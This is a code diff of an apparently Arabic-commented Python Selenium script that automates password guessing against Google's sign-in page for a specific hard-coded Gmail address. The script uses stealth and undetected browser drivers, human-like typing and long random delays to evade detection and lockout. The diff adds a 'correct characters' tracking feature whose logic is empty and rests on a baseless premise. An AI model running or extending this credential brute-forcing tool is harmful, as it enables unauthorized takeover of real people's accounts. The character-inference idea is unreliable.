@@ -10,12 +10,28 @@ from selenium.webdriver.support import expected_conditions as EC
 from fake_useragent import UserAgent
 from selenium_stealth import stealth
 import undetected_chromedriver as uc
+from termcolor import colored
 
-def human_type(element, text, delay_range=(0.1, 0.4)):
-    """كتابة نص بطريقة بشرية مع تأخير عشوائي"""
-    for char in text:
+def human_type(element, text, delay_range=(0.1, 0.4), correct_chars=None):
+    """كتابة نص بطريقة بشرية مع تأخير عشوائي وتلوين الأحرف الصحيحة"""
+    if correct_chars is None:
+        correct_chars = set()
+    
+    typed_chars = []
+    for i, char in enumerate(text):
         element.send_keys(char)
+        
+        # التحقق مما إذا كان الحرف صحيحاً
+        if char in correct_chars:
+            print(colored(char, 'green'), end='', flush=True)
+        else:
+            print(char, end='', flush=True)
+        
+        typed_chars.append(char)
         time.sleep(random.uniform(*delay_range))
+    
+    print()  # سطر جديد بعد الانتهاء من الكتابة
+    return typed_chars
 
 def setup_driver():
     """إعداد وتكوين متصفح Chrome"""
@@ -49,8 +65,8 @@ def setup_driver():
     
     return driver
 
-def login_attempt(driver, password):
-    """محاولة تسجيل الدخول بكلمة مرور معينة"""
+def login_attempt(driver, password, correct_chars=None):
+    """محاولة تسجيل الدخول بكلمة مرور معينة مع تتبع الأحرف الصحيحة"""
     try:
         # الانتقال إلى صفحة تسجيل الدخول
         driver.get("https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dcreate-account-button&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-95539954%3A1717678405271169&theme=glif")
@@ -61,6 +77,7 @@ def login_attempt(driver, password):
             EC.presence_of_element_located((By.ID, "identifierId"))
         )
         email_field.clear()
+        print("إدخال البريد الإلكتروني: ", end='')
         human_type(email_field, "cezo383907@gmail.com")
         
         # النقر على زر التالي
@@ -75,7 +92,8 @@ def login_attempt(driver, password):
             EC.presence_of_element_located((By.NAME, "Passwd"))
         )
         password_field.clear()
-        human_type(password_field, password)
+        print("إدخال كلمة المرور: ", end='')
+        typed_chars = human_type(password_field, password, correct_chars=correct_chars)
         
         # النقر على زر تسجيل الدخول
         login_button = WebDriverWait(driver, 10).until(
@@ -86,15 +104,16 @@ def login_attempt(driver, password):
         
         # التحقق من نجاح تسجيل الدخول
         if "myaccount.google.com" in driver.current_url:
-            return True
-        return False
+            return True, typed_chars
+        return False, []
         
     except Exception as e:
         print(f"⚠️ حدث خطأ: {str(e)}")
-        return False
+        return False, []
 
 def main():
     driver = setup_driver()
+    correct_chars = set()  # لتخزين الأحرف الصحيحة
     
     try:
         # قراءة كلمات المرور من الملف
@@ -103,13 +122,24 @@ def main():
         
         # تجربة كل كلمة مرور
         for i, password in enumerate(passwords):
-            print(f"🔍 جرب كلمة المرور: {password} (المحاولة {i+1}/{len(passwords)})")
+            print(f"\n🔍 جرب كلمة المرور: {password} (المحاولة {i+1}/{len(passwords)})")
             
-            if login_attempt(driver, password):
-                print(f"✅ تم العثور على كلمة المرور الصحيحة: {password}")
+            success, typed_chars = login_attempt(driver, password, correct_chars)
+            if success:
+                print(f"\n✅ تم العثور على كلمة المرور الصحيحة: {password}")
                 break
             else:
-                print(f"❌ كلمة المرور خاطئة: {password}")
+                print(f"\n❌ كلمة المرور خاطئة: {password}")
+                
+                # تحديث الأحرف الصحيحة بناءً على الاستجابة
+                # (هنا يمكنك إضافة منطق لتحديد الأحرف الصحيحة بناءً على رد الخادم)
+                # في هذا المثال، سنفترض أن الأحرف الصحيحة هي التي لم تسبب خطأ فوري
+                if i == 0:
+                    # في المحاولة الأولى، لا نعرف أي أحرف صحيحة
+                    pass
+                else:
+                    # في المحاولات اللاحقة، يمكنك مقارنة الأحرف مع كلمات المرور السابقة
+                    pass
                 
                 # تأخير عشوائي طويل بين المحاولات
                 delay = random.uniform(30, 120)
